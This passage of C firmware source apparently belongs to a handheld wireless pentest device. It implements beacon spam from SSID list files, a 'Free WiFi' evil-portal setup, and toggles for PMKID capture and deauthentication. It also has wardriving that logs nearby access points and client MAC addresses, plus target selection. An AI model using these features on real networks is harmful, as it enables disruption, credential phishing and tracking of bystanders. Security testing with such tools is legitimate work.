		ret = xQueueReceive(main_q_hdl, &q_item, pdMS_TO_TICKS(500));
		if (ret == pdTRUE && q_item.q_evt_type == Q_EVENT_KEYPAD)
		{
			xQueueReceive(button_events_q_hdl, &btn, 0);
			if (btn.event[BUTTON_BACK_KP_ID] == BUTTON_EVENT_CLICK)
			{
				m1_esp32_simple_cmd(CMD_BEACON_STOP, &resp, 1000);
				xQueueReset(main_q_hdl);
				break;
			}
			else if (btn.event[BUTTON_UP_KP_ID] == BUTTON_EVENT_CLICK)
			{
				if (display_offset >= 3) display_offset -= 3;
				else display_offset = 0;
				last_scroll_tick = HAL_GetTick();
			}
			else if (btn.event[BUTTON_DOWN_KP_ID] == BUTTON_EVENT_CLICK)
			{
				if (display_offset + 3 < ssid_count) display_offset += 3;
				else display_offset = 0;
				last_scroll_tick = HAL_GetTick();
			}
		}
	}
}

/*============================================================================*/
/*  Beacon Spam (SD-backed SSID lists)                                       */
/*============================================================================*/

#define BEACON_LIST_MAX_SSIDS 32
#define BEACON_LIST_LINE_MAX  96
#define BEACON_RANDOM_PICK_N  16
#define WIFI_SSID_LIST_FILE   "wifi/ssids.txt"

typedef enum {
	BEACON_LIST_ALL = 0,
	BEACON_LIST_SHUFFLE,
	BEACON_LIST_RANDOM
} beacon_list_mode_t;

static char beacon_file_ssids[BEACON_LIST_MAX_SSIDS][33];
static const char *beacon_file_ptrs[BEACON_LIST_MAX_SSIDS];
static uint8_t beacon_file_count = 0;

static uint8_t beacon_ascii_lower(uint8_t c)
{
	if (c >= 'A' && c <= 'Z') return c + ('a' - 'A');
	return c;
}

static bool beacon_ext_is_list(const char *name)
{
	const char *dot = strrchr(name, '.');
	if (!dot) return false;

	char ext[5] = {0};
	for (uint8_t i = 0; i < 4 && dot[i]; i++)
	{
		ext[i] = (char)beacon_ascii_lower((uint8_t)dot[i]);
	}

	return (strcmp(ext, ".txt") == 0 || strcmp(ext, ".lst") == 0);
}

static void beacon_message(const char *title, const char *line1, const char *line2)
{
	m1_u8g2_firstpage();
	u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
	u8g2_DrawStr(&m1_u8g2, 6, 12, title);
	u8g2_SetFont(&m1_u8g2, M1_DISP_FUNC_MENU_FONT_N);
	if (line1) u8g2_DrawStr(&m1_u8g2, 6, 30, line1);
	if (line2) u8g2_DrawStr(&m1_u8g2, 6, 42, line2);
	m1_u8g2_nextpage();
	HAL_Delay(2000);
}

static char *beacon_trim_line(char *line)
{
	char *p = line;
	while (*p == ' ' || *p == '\t') p++;

	int len = strlen(p);
	while (len > 0)
	{
		char c = p[len - 1];
		if (c != '\r' && c != '\n' && c != ' ' && c != '\t')
		{
			break;
		}
		p[--len] = '\0';
	}

	return p;
}

static bool beacon_ssid_exists(uint8_t count, const char *ssid)
{
	for (uint8_t i = 0; i < count; i++)
	{
		if (strcmp(beacon_file_ssids[i], ssid) == 0)
		{
			return true;
		}
	}
	return false;
}

static bool beacon_make_fullpath(const S_M1_file_info *f_info, char *path, size_t path_len)
{
	int dlen;

	if (!f_info || !f_info->file_is_selected || !path || path_len == 0)
	{
		return false;
	}

	dlen = strlen(f_info->dir_name);
	if (dlen > 0 && f_info->dir_name[dlen - 1] == '/')
	{
		snprintf(path, path_len, "%s%s", f_info->dir_name, f_info->file_name);
	}
	else
	{
		snprintf(path, path_len, "%s/%s", f_info->dir_name, f_info->file_name);
	}

	return true;
}

static uint8_t beacon_load_list_file(const S_M1_file_info *f_info)
{
	FIL fil;
	char path[128];
	char line[BEACON_LIST_LINE_MAX];
	uint8_t count = 0;

	if (!beacon_make_fullpath(f_info, path, sizeof(path)))
	{
		return 0;
	}

	if (f_open(&fil, path, FA_READ) != FR_OK)
	{
		return 0;
	}

	memset(beacon_file_ssids, 0, sizeof(beacon_file_ssids));
	memset(beacon_file_ptrs, 0, sizeof(beacon_file_ptrs));
	beacon_file_count = 0;

	while (count < BEACON_LIST_MAX_SSIDS && f_gets(line, sizeof(line), &fil) != NULL)
	{
		char *ssid = beacon_trim_line(line);
		uint8_t len;

		if (ssid[0] == '\0' || ssid[0] == '#' || ssid[0] == ';')
		{
			continue;
		}

		len = (uint8_t)strnlen(ssid, 32);
		if (len == 0)
		{
			continue;
		}

		ssid[len] = '\0';
		if (beacon_ssid_exists(count, ssid))
		{
			continue;
		}

		memcpy(beacon_file_ssids[count], ssid, len);
		beacon_file_ssids[count][len] = '\0';
		beacon_file_ptrs[count] = beacon_file_ssids[count];
		count++;
	}

	f_close(&fil);
	beacon_file_count = count;
	return count;
}

static uint32_t beacon_list_random_next(uint32_t *seed)
{
	*seed ^= *seed << 13;
	*seed ^= *seed >> 17;
	*seed ^= *seed << 5;
	return *seed;
}

static void beacon_list_shuffle_ptrs(const char **ptrs, uint8_t count)
{
	uint32_t seed = HAL_GetTick() ^ 0xA53C19EF;

	for (int i = count - 1; i > 0; i--)
	{
		int j = beacon_list_random_next(&seed) % (i + 1);
		const char *tmp = ptrs[i];
		ptrs[i] = ptrs[j];
		ptrs[j] = tmp;
	}
}

static bool beacon_select_mode(beacon_list_mode_t *mode)
{
	static const char *items[] = {"All in Order", "Shuffle All", "Random 16"};
	S_M1_Buttons_Status btn;
	S_M1_Main_Q_t q_item;
	BaseType_t ret;
	uint8_t selected = 0;

	while (1)
	{
		m1_u8g2_firstpage();
		u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
		u8g2_DrawXBMP(&m1_u8g2, 0, 0, 128, 14, m1_frame_128_14);
		u8g2_DrawStr(&m1_u8g2, 2, M1_GUI_ROW_SPACING + M1_GUI_FONT_HEIGHT,
				"BEACON SPAM");

		u8g2_SetFont(&m1_u8g2, M1_DISP_FUNC_MENU_FONT_N);
		for (uint8_t i = 0; i < 3; i++)
		{
			uint8_t y = 24 + i * 11;
			if (i == selected)
			{
				u8g2_DrawBox(&m1_u8g2, 0, y - 8, 128, 10);
				u8g2_SetDrawColor(&m1_u8g2, M1_DISP_DRAW_COLOR_BG);
			}
			u8g2_DrawStr(&m1_u8g2, 4, y, items[i]);
			if (i == selected)
			{
				u8g2_SetDrawColor(&m1_u8g2, M1_DISP_DRAW_COLOR_TXT);
			}
		}
		u8g2_DrawStr(&m1_u8g2, 2, 63, "[OK]Pick [BACK]Exit");
		m1_u8g2_nextpage();

		ret = xQueueReceive(main_q_hdl, &q_item, portMAX_DELAY);
		if (ret == pdTRUE && q_item.q_evt_type == Q_EVENT_KEYPAD)
		{
			xQueueReceive(button_events_q_hdl, &btn, 0);
			if (btn.event[BUTTON_BACK_KP_ID] == BUTTON_EVENT_CLICK)
			{
				xQueueReset(main_q_hdl);
				return false;
			}
			else if (btn.event[BUTTON_UP_KP_ID] == BUTTON_EVENT_CLICK)
			{
				selected = (selected == 0) ? 2 : selected - 1;
			}
			else if (btn.event[BUTTON_DOWN_KP_ID] == BUTTON_EVENT_CLICK)
			{
				selected++;
				if (selected >= 3) selected = 0;
			}
			else if (btn.event[BUTTON_OK_KP_ID] == BUTTON_EVENT_CLICK)
			{
				*mode = (beacon_list_mode_t)selected;
				xQueueReset(main_q_hdl);
				return true;
			}
		}
	}
}

void wifi_attack_beacon(void)
{
	m1_resp_t resp;
	m1_cmd_t cmd;
	beacon_load_diag_t load_diag;
	beacon_list_mode_t mode;
	S_M1_file_info *f_info;
	uint8_t list_count;
	uint8_t tx_count;
	bool shuffle_beacons;

	ensure_esp32_ready();

	if (!beacon_select_mode(&mode))
	{
		return;
	}

	f_info = storage_browse();
	if (!f_info || !f_info->file_is_selected)
	{
		return;
	}

	if (!beacon_ext_is_list(f_info->file_name))
	{
		beacon_message("Beacon Spam", "Use .txt/.lst", "1 SSID per line");
		return;
	}

	list_count = beacon_load_list_file(f_info);
	if (list_count == 0)
	{
		beacon_message("Beacon Spam", "No SSIDs loaded", "Check list file");
		return;
	}

	tx_count = list_count;
	shuffle_beacons = false;

	if (mode == BEACON_LIST_SHUFFLE)
	{
		shuffle_beacons = true;
	}
	else if (mode == BEACON_LIST_RANDOM)
	{
		beacon_list_shuffle_ptrs(beacon_file_ptrs, list_count);
		tx_count = (list_count > BEACON_RANDOM_PICK_N) ? BEACON_RANDOM_PICK_N : list_count;
		shuffle_beacons = true;
	}

	uint8_t total = beacon_batch_load(beacon_file_ptrs, tx_count, &load_diag);
	if (total == 0)
	{
		beacon_load_failed_screen("Beacon Spam", &load_diag);
		HAL_Delay(2000);
		return;
	}

	beacon_set_flags(shuffle_beacons ? 0x01 : 0x00);

	memset(&cmd, 0, sizeof(cmd));
	cmd.magic = M1_CMD_MAGIC;
	cmd.cmd_id = CMD_BEACON_START;
	cmd.payload_len = 0;
	int spi_ret = m1_esp32_send_cmd(&cmd, &resp, SNIFF_CMD_TIMEOUT);
	if (spi_ret != 0 || resp.status != RESP_OK)
	{
		beacon_message("Beacon Spam", "Start failed!", NULL);
		return;
	}

	beacon_run_loop("BEACON SPAM", beacon_file_ptrs, tx_count, total, false);
}

/*============================================================================*/
/*  WiFi General / Config                                                     */
/*============================================================================*/

#define WIFI_AP_CACHE_DIR  "wifi"
#define WIFI_AP_CACHE_FILE "wifi/aps.tsv"
#define WIFI_STA_CACHE_FILE "wifi/stations.tsv"
#define WIFI_AP_CACHE_LINE_MAX 128
#define WIFI_JOIN_PASS_MAX 63
#define EP_HTML_MAX_BYTES 32768
#define EP_HTML_CHUNK_BYTES M1_MAX_PAYLOAD
#define WIFI_PORTAL_CFG_FILE "wifi/portal.cfg"

static char wifi_portal_ssid[33] = "Free WiFi";
static char wifi_portal_html_path[128];
static char wifi_portal_html_name[33];
static bool wifi_portal_cfg_loaded = false;

static bool wifi_ext_is_ap_cache(const char *name)
{
	const char *dot = strrchr(name, '.');
	if (!dot) return false;

	char ext[5] = {0};
	for (uint8_t i = 0; i < 4 && dot[i]; i++)
	{
		ext[i] = (char)beacon_ascii_lower((uint8_t)dot[i]);
	}

	return (strcmp(ext, ".tsv") == 0 || strcmp(ext, ".txt") == 0);
}

static bool wifi_ext_is_html(const char *name)
{
	const char *dot = strrchr(name, '.');
	if (!dot) return false;

	char ext[6] = {0};
	for (uint8_t i = 0; i < 5 && dot[i]; i++)
	{
		ext[i] = (char)beacon_ascii_lower((uint8_t)dot[i]);
	}

	return (strcmp(ext, ".html") == 0 || strcmp(ext, ".htm") == 0);
}

static void wifi_portal_name_from_path(const char *path, char *name, size_t name_len)
{
	const char *base;

	if (!name || name_len == 0)
	{
		return;
	}

	name[0] = '\0';
	if (!path || path[0] == '\0')
	{
		return;
	}

	base = strrchr(path, '/');
	base = base ? base + 1 : path;
	strncpy(name, base, name_len - 1);
	name[name_len - 1] = '\0';
}

static void wifi_portal_cfg_load(void)
{
	FIL fil;
	char line[160];

	if (wifi_portal_cfg_loaded)
	{
		return;
	}
	wifi_portal_cfg_loaded = true;

	if (f_open(&fil, WIFI_PORTAL_CFG_FILE, FA_READ) != FR_OK)
	{
		return;
	}

	while (f_gets(line, sizeof(line), &fil) != NULL)
	{
		char *p = beacon_trim_line(line);
		if (strncmp(p, "ssid=", 5) == 0)
		{
			strncpy(wifi_portal_ssid, p + 5, sizeof(wifi_portal_ssid) - 1);
			wifi_portal_ssid[sizeof(wifi_portal_ssid) - 1] = '\0';
			if (wifi_portal_ssid[0] == '\0')
			{
				strcpy(wifi_portal_ssid, "Free WiFi");
			}
		}
		else if (strncmp(p, "html=", 5) == 0)
		{
			strncpy(wifi_portal_html_path, p + 5, sizeof(wifi_portal_html_path) - 1);
			wifi_portal_html_path[sizeof(wifi_portal_html_path) - 1] = '\0';
			wifi_portal_name_from_path(wifi_portal_html_path,
				wifi_portal_html_name, sizeof(wifi_portal_html_name));
		}
	}
	f_close(&fil);
}

static void wifi_portal_cfg_save(void)
{
	FIL fil;
	UINT bw;
	char line[180];
	int len;

	f_mkdir(WIFI_AP_CACHE_DIR);
	if (f_open(&fil, WIFI_PORTAL_CFG_FILE, FA_CREATE_ALWAYS | FA_WRITE) != FR_OK)
	{
		return;
	}

	len = snprintf(line, sizeof(line), "ssid=%s\r\nhtml=%s\r\n",
		wifi_portal_ssid, wifi_portal_html_path);
	if (len > 0)
	{
		f_write(&fil, line, len, &bw);
	}
	f_close(&fil);
}

static void wifi_sanitize_field(char *dst, const char *src, size_t dst_len)
{
	size_t i;

	if (!dst || dst_len == 0)
	{
		return;
	}

	for (i = 0; i + 1 < dst_len && src && src[i]; i++)
	{
		char c = src[i];
		dst[i] = (c == '\t' || c == '\r' || c == '\n') ? ' ' : c;
	}
	dst[i] = '\0';
}

static void wifi_csv_quote_field(char *dst, const char *src, size_t dst_len)
{
	size_t di = 0;
	if (!dst || dst_len == 0)
	{
		return;
	}

	dst[di++] = '"';
	for (size_t si = 0; src && src[si] && di + 2 < dst_len; si++)
	{
		char c = src[si];
		if (c == '\r' || c == '\n')
		{
			c = ' ';
		}
		if (c == '"')
		{
			if (di + 3 >= dst_len) break;
			dst[di++] = '"';
			dst[di++] = '"';
		}
		else
		{
			dst[di++] = c;
		}
	}
	dst[di++] = '"';
	dst[di] = '\0';
}

void wifi_general_status(void)
{
	S_M1_Buttons_Status btn;
	S_M1_Main_Q_t q_item;
	BaseType_t ret;
	char ln[26];

	wifi_portal_cfg_load();

	m1_u8g2_firstpage();
	u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
	u8g2_DrawXBMP(&m1_u8g2, 0, 0, 128, 14, m1_frame_128_14);
	u8g2_DrawStr(&m1_u8g2, 2, M1_GUI_ROW_SPACING + M1_GUI_FONT_HEIGHT, "WIFI STATUS");

	u8g2_SetFont(&m1_u8g2, M1_DISP_FUNC_MENU_FONT_N);
	snprintf(ln, sizeof(ln), "APs:%u Sel:%u", ap_count, wifi_selected_ap_count());
	u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START, ln);
	snprintf(ln, sizeof(ln), "STAs:%u Sel:%u", sta_total, wifi_selected_sta_count());
	u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START + SF_Y_STEP, ln);
	snprintf(ln, sizeof(ln), "SSIDs:%u", beacon_file_count);
	u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START + 2 * SF_Y_STEP, ln);
	snprintf(ln, sizeof(ln), "HTML:%s",
		wifi_portal_html_path[0] ? "Custom" : "Built-in");
	u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START + 3 * SF_Y_STEP, ln);
	u8g2_DrawStr(&m1_u8g2, 2, 63, "[BACK]Exit");
	m1_u8g2_nextpage();

	while (1)
	{
		ret = xQueueReceive(main_q_hdl, &q_item, portMAX_DELAY);
		if (ret == pdTRUE && q_item.q_evt_type == Q_EVENT_KEYPAD)
		{
			xQueueReceive(button_events_q_hdl, &btn, 0);
			if (btn.event[BUTTON_BACK_KP_ID] == BUTTON_EVENT_CLICK)
			{
				xQueueReset(main_q_hdl);
				break;
			}
		}
	}
}

void wifi_general_capture_status(void)
{
	S_M1_Buttons_Status btn;
	S_M1_Main_Q_t q_item;
	BaseType_t ret;
	char ln[26];

	wifi_capture_cfg_load();

	while (1)
	{
		m1_u8g2_firstpage();
		u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
		u8g2_DrawXBMP(&m1_u8g2, 0, 0, 128, 14, m1_frame_128_14);
		u8g2_DrawStr(&m1_u8g2, 2, M1_GUI_ROW_SPACING + M1_GUI_FONT_HEIGHT,
			"MARAUDER CFG");

		u8g2_SetFont(&m1_u8g2, M1_DISP_FUNC_MENU_FONT_N);
		snprintf(ln, sizeof(ln), "SavePCAP:%s", wifi_onoff(wifi_capture_cfg.save_pcap));
		u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START, ln);
		snprintf(ln, sizeof(ln), "ForcePMKID:%s", wifi_onoff(wifi_capture_cfg.force_pmkid));
		u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START + SF_Y_STEP, ln);
		snprintf(ln, sizeof(ln), "ForceProbe:%s", wifi_onoff(wifi_capture_cfg.force_probe));
		u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START + 2 * SF_Y_STEP, ln);
		snprintf(ln, sizeof(ln), "EPDeauth:%s", wifi_onoff(wifi_capture_cfg.ep_deauth));
		u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START + 3 * SF_Y_STEP, ln);
		u8g2_DrawStr(&m1_u8g2, 2, 63, "[BACK]Exit");
		m1_u8g2_nextpage();

		ret = xQueueReceive(main_q_hdl, &q_item, portMAX_DELAY);
		if (ret == pdTRUE && q_item.q_evt_type == Q_EVENT_KEYPAD)
		{
			xQueueReceive(button_events_q_hdl, &btn, 0);
			if (btn.event[BUTTON_BACK_KP_ID] == BUTTON_EVENT_CLICK)
			{
				xQueueReset(main_q_hdl);
				break;
			}
		}
	}
}

static void wifi_capture_toggle(bool *field, const char *title)
{
	char line[26];

	wifi_capture_cfg_load();
	*field = !*field;
	wifi_capture_cfg_save();
	snprintf(line, sizeof(line), "%s", wifi_onoff(*field));
	wifi_show_message(title, line, WIFI_CAPTURE_CFG_FILE);
}

void wifi_general_toggle_save_pcap(void)
{
	wifi_capture_toggle(&wifi_capture_cfg.save_pcap, "SavePCAP");
}

void wifi_general_toggle_force_pmkid(void)
{
	wifi_capture_toggle(&wifi_capture_cfg.force_pmkid, "ForcePMKID");
}

void wifi_general_toggle_force_probe(void)
{
	wifi_capture_toggle(&wifi_capture_cfg.force_probe, "ForceProbe");
}

void wifi_general_toggle_ep_deauth(void)
{
	wifi_capture_toggle(&wifi_capture_cfg.ep_deauth, "EPDeauth");
}

#define WIFI_WARDRIVE_AP_FILE      "wifi/wardrive_aps.csv"
#define WIFI_WARDRIVE_STA_FILE     "wifi/wardrive_stations.csv"

static bool wifi_append_header_if_new(FIL *fil, const char *path, const char *header)
{
	FILINFO info;
	UINT bw;
	bool new_file = (f_stat(path, &info) != FR_OK || info.fsize == 0);

	if (f_open(fil, path, FA_WRITE | FA_OPEN_APPEND) != FR_OK)
	{
		return false;
	}

	if (new_file && header)
	{
		f_write(fil, header, strlen(header), &bw);
	}

	return true;
}

void wifi_wardrive(void)
{
	FIL fil;
	UINT bw;
	char line[160];
	char ssid[70];

	ensure_esp32_ready();
	wifi_show_message("Wardrive", "Scanning APs...", NULL);
	if (wifi_do_scan() == 0)
	{
		wifi_show_message("Wardrive", "No APs found", NULL);
		return;
	}

	f_mkdir(WIFI_AP_CACHE_DIR);
	if (!wifi_append_header_if_new(&fil, WIFI_WARDRIVE_AP_FILE,
		"ssid,bssid,channel,rssi,auth\r\n"))
	{
		wifi_show_message("Wardrive", "File open failed", NULL);
		return;
	}

	for (uint16_t i = 0; i < ap_count; i++)
	{
		wifi_csv_quote_field(ssid, ap_list[i].ssid[0] ? ap_list[i].ssid : "*hidden*", sizeof(ssid));
		int len = snprintf(line, sizeof(line), "%s,%s,%u,%d,%u\r\n",
			ssid, ap_list[i].bssid_str, ap_list[i].channel,
			ap_list[i].rssi, ap_list[i].auth_mode);
		if (len > 0)
		{
			f_write(&fil, line, len, &bw);
		}
	}
	f_close(&fil);

	snprintf(line, sizeof(line), "Saved %d APs", ap_count);
	wifi_show_message("Wardrive", line, WIFI_WARDRIVE_AP_FILE);
}

void wifi_station_wardrive(void)
{
	FIL fil;
	UINT bw;
	char line[180];
	char ssid[70];

	ensure_esp32_ready();
	if (sta_do_scan() == 0)
	{
		wifi_show_message("Station Wardrive", "No stations found", NULL);
		return;
	}

	f_mkdir(WIFI_AP_CACHE_DIR);
	if (!wifi_append_header_if_new(&fil, WIFI_WARDRIVE_STA_FILE,
		"mac,bssid,channel,rssi,ssid\r\n"))
	{
		wifi_show_message("Station Wardrive", "File open failed", NULL);
		return;
	}

	for (uint16_t i = 0; i < sta_total; i++)
	{
		wifi_csv_quote_field(ssid, sta_list_data[i].ssid[0] ? sta_list_data[i].ssid : "", sizeof(ssid));
		int len = snprintf(line, sizeof(line),
			"%s,%02X:%02X:%02X:%02X:%02X:%02X,%u,%d,%s\r\n",
			sta_list_data[i].mac_str,
			sta_list_data[i].bssid[0], sta_list_data[i].bssid[1],
			sta_list_data[i].bssid[2], sta_list_data[i].bssid[3],
			sta_list_data[i].bssid[4], sta_list_data[i].bssid[5],
			sta_list_data[i].channel, sta_list_data[i].rssi, ssid);
		if (len > 0)
		{
			f_write(&fil, line, len, &bw);
		}
	}
	f_close(&fil);

	snprintf(line, sizeof(line), "Saved %d STAs", sta_total);
	wifi_show_message("Station Wardrive", line, WIFI_WARDRIVE_STA_FILE);
}

static bool wifi_parse_bssid(const char *s, uint8_t bssid[6])
{
	unsigned int b[6];

	if (sscanf(s, "%02x:%02x:%02x:%02x:%02x:%02x",
		&b[0], &b[1], &b[2], &b[3], &b[4], &b[5]) != 6)
	{
		return false;
	}

	for (uint8_t i = 0; i < 6; i++)
	{
		if (b[i] > 0xFF) return false;
		bssid[i] = (uint8_t)b[i];
	}
	return true;
}

static uint16_t wifi_selected_ap_count(void)
{
	uint16_t count = 0;
	for (uint16_t i = 0; i < ap_count; i++)
	{
		if (ap_list[i].selected) count++;
	}
	return count;
}

static uint16_t wifi_selected_sta_count(void)
{
	uint16_t count = 0;
	if (!sta_list_data) return 0;
	for (uint16_t i = 0; i < sta_total; i++)
	{
		if (sta_list_data[i].selected) count++;
	}
	return count;
}

static void wifi_draw_ap_select(void)
{
	char ln[26];
	uint8_t y;

	m1_u8g2_firstpage();
	u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
	u8g2_DrawXBMP(&m1_u8g2, 0, 0, 128, 14, m1_frame_128_14);
	u8g2_DrawStr(&m1_u8g2, 2, M1_GUI_ROW_SPACING + M1_GUI_FONT_HEIGHT, "SELECT AP");
	snprintf(ln, sizeof(ln), "%s%d/%d", ap_list[ap_view_idx].selected ? "*" : "",
		ap_view_idx + 1, ap_count);
	u8g2_DrawStr(&m1_u8g2, 128 - strlen(ln) * M1_GUI_FONT_WIDTH,
		M1_GUI_ROW_SPACING + M1_GUI_FONT_HEIGHT, ln);

	u8g2_SetFont(&m1_u8g2, M1_DISP_FUNC_MENU_FONT_N);
	y = SF_Y_START;

	if (ap_list[ap_view_idx].ssid[0] == '\0') strcpy(ln, "*hidden*");
	else
	{
		strncpy(ln, ap_list[ap_view_idx].ssid, 24);
		ln[24] = '\0';
	}
	u8g2_DrawStr(&m1_u8g2, 2, y, ln); y += SF_Y_STEP;
	u8g2_DrawStr(&m1_u8g2, 2, y, ap_list[ap_view_idx].bssid_str); y += SF_Y_STEP;
	snprintf(ln, sizeof(ln), "CH:%d RSSI:%ddBm",
		ap_list[ap_view_idx].channel, ap_list[ap_view_idx].rssi);
	u8g2_DrawStr(&m1_u8g2, 2, y, ln); y += SF_Y_STEP;
	snprintf(ln, sizeof(ln), "Selected:%d", wifi_selected_ap_count());
	u8g2_DrawStr(&m1_u8g2, 2, y, ln);
	u8g2_DrawStr(&m1_u8g2, 2, 63, "[OK]Sel [BACK]Exit");
	m1_u8g2_nextpage();
}

static void wifi_draw_sta_select(void)
{
	char ln[26];
	uint8_t y;
	uint8_t *b;

	m1_u8g2_firstpage();
	u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
	u8g2_DrawXBMP(&m1_u8g2, 0, 0, 128, 14, m1_frame_128_14);
	u8g2_DrawStr(&m1_u8g2, 2, M1_GUI_ROW_SPACING + M1_GUI_FONT_HEIGHT, "SELECT STA");
	snprintf(ln, sizeof(ln), "%s%d/%d", sta_list_data[sta_view_idx].selected ? "*" : "",
		sta_view_idx + 1, sta_total);
	u8g2_DrawStr(&m1_u8g2, 128 - strlen(ln) * M1_GUI_FONT_WIDTH,
		M1_GUI_ROW_SPACING + M1_GUI_FONT_HEIGHT, ln);

	u8g2_SetFont(&m1_u8g2, M1_DISP_FUNC_MENU_FONT_N);
	y = SF_Y_START;
	u8g2_DrawStr(&m1_u8g2, 2, y, sta_list_data[sta_view_idx].mac_str); y += SF_Y_STEP;
	if (sta_list_data[sta_view_idx].ssid[0])
	{
		strncpy(ln, sta_list_data[sta_view_idx].ssid, 24);
		ln[24] = '\0';
	}
	else strcpy(ln, "*no probe*");
	u8g2_DrawStr(&m1_u8g2, 2, y, ln); y += SF_Y_STEP;
	b = sta_list_data[sta_view_idx].bssid;
	snprintf(ln, sizeof(ln), "AP:%02X:%02X:%02X:%02X:%02X:%02X",
		b[0], b[1], b[2], b[3], b[4], b[5]);
	u8g2_DrawStr(&m1_u8g2, 2, y, ln); y += SF_Y_STEP;
	snprintf(ln, sizeof(ln), "Selected:%d", wifi_selected_sta_count());
	u8g2_DrawStr(&m1_u8g2, 2, y, ln);
	u8g2_DrawStr(&m1_u8g2, 2, 63, "[OK]Sel [BACK]Exit");
	m1_u8g2_nextpage();
}

void wifi_general_select_aps(void)
{
	S_M1_Buttons_Status btn;
	S_M1_Main_Q_t q_item;
	BaseType_t ret;

	if (!ap_list || ap_count == 0)
	{
		wifi_show_message("Select APs", "No AP cache", "Scan or Load APs");
		return;
	}

	if (ap_view_idx >= ap_count) ap_view_idx = 0;
	wifi_draw_ap_select();

	while (1)
	{
		ret = xQueueReceive(main_q_hdl, &q_item, portMAX_DELAY);
		if (ret == pdTRUE && q_item.q_evt_type == Q_EVENT_KEYPAD)
		{
			xQueueReceive(button_events_q_hdl, &btn, 0);
			if (btn.event[BUTTON_BACK_KP_ID] == BUTTON_EVENT_CLICK)
			{
				xQueueReset(main_q_hdl);
				break;
			}
			else if (btn.event[BUTTON_UP_KP_ID] == BUTTON_EVENT_CLICK)
			{
				ap_view_idx = (ap_view_idx == 0) ? ap_count - 1 : ap_view_idx - 1;
				wifi_draw_ap_select();
			}
			else if (btn.event[BUTTON_DOWN_KP_ID] == BUTTON_EVENT_CLICK)
			{
				ap_view_idx++;
				if (ap_view_idx >= ap_count) ap_view_idx = 0;
				wifi_draw_ap_select();
			}
			else if (btn.event[BUTTON_OK_KP_ID] == BUTTON_EVENT_CLICK)
			{
				ap_list[ap_view_idx].selected = !ap_list[ap_view_idx].selected;
				wifi_draw_ap_select();
			}
		}
	}
}

void wifi_general_select_all_aps(void)
{
	char ln[26];

	if (!ap_list || ap_count == 0)
	{
		wifi_show_message("Select All APs", "No AP cache", "Scan or Load APs");
		return;
	}

	for (uint16_t i = 0; i < ap_count; i++)
	{
		ap_list[i].selected = true;
	}

	snprintf(ln, sizeof(ln), "Selected %u APs", ap_count);
	wifi_show_message("Select All APs", ln, NULL);
}

void wifi_general_clear_ap_selection(void)
{
	if (!ap_list || ap_count == 0)
	{
		wifi_show_message("Clear AP Sel", "No AP cache", "Scan or Load APs");
		return;
	}

	for (uint16_t i = 0; i < ap_count; i++)
	{
		ap_list[i].selected = false;
	}

	wifi_show_message("Clear AP Sel", "AP selection clear", NULL);
}

void wifi_general_select_stations(void)
{
	S_M1_Buttons_Status btn;
	S_M1_Main_Q_t q_item;
	BaseType_t ret;

	if (!sta_list_data || sta_total == 0)
	{
		wifi_show_message("Select Stations", "No station cache", "Scan Stations first");
		return;
	}

	if (sta_view_idx >= sta_total) sta_view_idx = 0;
	wifi_draw_sta_select();

	while (1)
	{
		ret = xQueueReceive(main_q_hdl, &q_item, portMAX_DELAY);
		if (ret == pdTRUE && q_item.q_evt_type == Q_EVENT_KEYPAD)
		{
			xQueueReceive(button_events_q_hdl, &btn, 0);
			if (btn.event[BUTTON_BACK_KP_ID] == BUTTON_EVENT_CLICK)
			{
				xQueueReset(main_q_hdl);
				break;
			}
			else if (btn.event[BUTTON_UP_KP_ID] == BUTTON_EVENT_CLICK)
			{
				sta_view_idx = (sta_view_idx == 0) ? sta_total - 1 : sta_view_idx - 1;
				wifi_draw_sta_select();
			}
			else if (btn.event[BUTTON_DOWN_KP_ID] == BUTTON_EVENT_CLICK)
			{
				sta_view_idx++;
				if (sta_view_idx >= sta_total) sta_view_idx = 0;
				wifi_draw_sta_select();
			}
			else if (btn.event[BUTTON_OK_KP_ID] == BUTTON_EVENT_CLICK)
			{
				sta_list_data[sta_view_idx].selected = !sta_list_data[sta_view_idx].selected;
				wifi_draw_sta_select();
			}
		}
	}
}

void wifi_general_select_all_stations(void)
{
	char ln[26];

	if (!sta_list_data || sta_total == 0)
	{
		wifi_show_message("Select All Stations", "No station cache", "Scan Stations first");
		return;
	}

	for (uint16_t i = 0; i < sta_total; i++)
	{
		sta_list_data[i].selected = true;
	}

	snprintf(ln, sizeof(ln), "Selected %u STAs", sta_total);
	wifi_show_message("Select All Stations", ln, NULL);
}

void wifi_general_clear_station_selection(void)
{
	if (!sta_list_data || sta_total == 0)
	{
		wifi_show_message("Clear Sta Sel", "No station cache", "Scan Stations first");
		return;
	}

	for (uint16_t i = 0; i < sta_total; i++)
	{
		sta_list_data[i].selected = false;
	}

	wifi_show_message("Clear Sta Sel", "STA selection clear", NULL);
}

static void wifi_draw_ap_info(void)
{
	char ln[26];
	uint8_t y;

	m1_u8g2_firstpage();
	u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
	u8g2_DrawXBMP(&m1_u8g2, 0, 0, 128, 14, m1_frame_128_14);
	u8g2_DrawStr(&m1_u8g2, 2, M1_GUI_ROW_SPACING + M1_GUI_FONT_HEIGHT, "AP INFO");
	snprintf(ln, sizeof(ln), "%d/%d", ap_view_idx + 1, ap_count);
	u8g2_DrawStr(&m1_u8g2, 128 - strlen(ln) * M1_GUI_FONT_WIDTH,
		M1_GUI_ROW_SPACING + M1_GUI_FONT_HEIGHT, ln);

	u8g2_SetFont(&m1_u8g2, M1_DISP_FUNC_MENU_FONT_N);
	y = SF_Y_START;

	if (ap_list[ap_view_idx].ssid[0] == '\0')
	{
		strcpy(ln, "*hidden*");
	}
	else
	{
